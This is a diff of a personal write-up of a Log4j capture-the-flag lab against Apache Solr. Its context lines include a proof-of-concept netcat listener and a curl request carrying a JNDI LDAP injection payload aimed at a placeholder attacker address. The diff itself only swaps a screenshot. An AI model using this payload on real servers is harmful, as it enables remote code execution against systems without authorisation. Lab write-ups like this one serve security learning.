@@ -44,7 +44,7 @@ Correct Answer:params
 ### Task 4: Proof Of Concept
 Here we are Connecting  nc -lnvp 9999  netcat to connect the  website  curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\}'   In this we change into attacker's op address to inject the vulnerablility malicious java code due to the use of the $ dollar-sign character in your syntax, you must ensure you wrap the URL within single-quotes so bash (your command-line shell) does not interpret it as a variable. And the connection received to the netcat port.
 
-<img width="1912" height="1000" alt="Screenshot 2026-03-22 140009" src="https://github.com/user-attachments/assets/1796504a-b789-4a92-b049-7c2afab74fa1" />
+<img width="959" height="536" alt="image" src="https://github.com/user-attachments/assets/00734076-2865-4cf5-ad43-e4dd952c7e93" />
 
 
 <img width="1919" height="933" alt="Screenshot 2026-03-22 140116" src="https://github.com/user-attachments/assets/9a73f039-f1b2-4f96-a2ad-8c494142741c" />
@@ -69,6 +69,7 @@ In this Log4j vulnerability lets attackers run code using a special text input. 
 
 
 ## Task 6: Persistence
+
 
 
 
